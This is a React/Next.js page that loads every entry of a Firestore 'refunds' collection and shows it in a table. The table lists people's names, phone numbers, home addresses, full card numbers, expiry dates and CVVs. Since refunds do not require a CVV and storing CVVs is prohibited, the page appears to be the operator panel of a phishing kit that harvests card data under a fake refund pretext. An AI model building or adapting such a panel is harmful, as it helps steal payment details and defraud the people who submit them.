"use client";

import { useState, useEffect } from "react";
import { db } from "@/src/utils/firebase";
import { collection, getDocs } from "firebase/firestore";
import "@/src/globals.css"


interface RefundData {
  id: string; // Firestore document ID
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  timestamp: string;
}

export default function Home() {
  const [refunds, setRefunds] = useState<RefundData[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const fetchRefunds = async () => {
      setLoading(true);
      setError(null);

      try {
        const querySnapshot = await getDocs(collection(db, "refunds"));
        const refundsData: RefundData[] = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as RefundData[];
        setRefunds(refundsData);
      } catch (err) {
        setError("Failed to load refund data. Please try again.");
        console.error("Error fetching refunds:", err);
      } finally {
        setLoading(false);
      }
    };

    fetchRefunds();
  }, []);

  if (loading) {
    return (
      <div className="flex items-center justify-center h-screen">
        <p className="text-xl font-semibold text-gray-600">Loading refund data...</p>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex items-center justify-center h-screen">
        <p className="text-xl font-semibold text-red-500">{error}</p>
      </div>
    );
  }

  return (
    <>
      <header className="py-6 bg-gray-800 text-white">
        <div className="container mx-auto text-center">
          <img
            src="https://i.postimg.cc/CLKVXjQf/images.png"
            alt="Logo"
            className="mx-auto w-24"
          />
          <h1 className="text-3xl font-bold">Refund Requests</h1>
        </div>
      </header>
      <main className="container mx-auto my-6 px-4">
        <div className="overflow-x-auto">
          <table className="table-auto w-full border-collapse border border-gray-300">
            <thead className="bg-gray-200">
              <tr>
                <th className="border border-gray-300 px-4 py-2">Reference ID</th>
                <th className="border border-gray-300 px-4 py-2">Reason</th>
                <th className="border border-gray-300 px-4 py-2">First Name</th>
                <th className="border border-gray-300 px-4 py-2">Last Name</th>
                <th className="border border-gray-300 px-4 py-2">Mobile Number</th>
                <th className="border border-gray-300 px-4 py-2">Home Address</th>
                <th className="border border-gray-300 px-4 py-2">Zip Code</th>
                <th className="border border-gray-300 px-4 py-2">Card Type</th>
                <th className="border border-gray-300 px-4 py-2">Card Number</th>
                <th className="border border-gray-300 px-4 py-2">Expiration Date</th>
                <th className="border border-gray-300 px-4 py-2">CVV</th>
                <th className="border border-gray-300 px-4 py-2">Timestamp</th>
              </tr>
            </thead>
            <tbody>
              {refunds.map((refund) => (
                <tr key={refund.id} className="odd:bg-white even:bg-gray-100">
                  <td className="border border-gray-300 px-4 py-2">{refund.orderId}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.reason}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.firstName}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.lastName}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.mobileNumber}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.homeAddress}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.zipCode}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.cardType}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.cardNumber}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.expirationDate}</td>
                  <td className="border border-gray-300 px-4 py-2">{refund.cvv}</td>
                  <td className="border border-gray-300 px-4 py-2">
                    {new Date(refund.timestamp).toLocaleString()}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </main>
    </>
  );
}
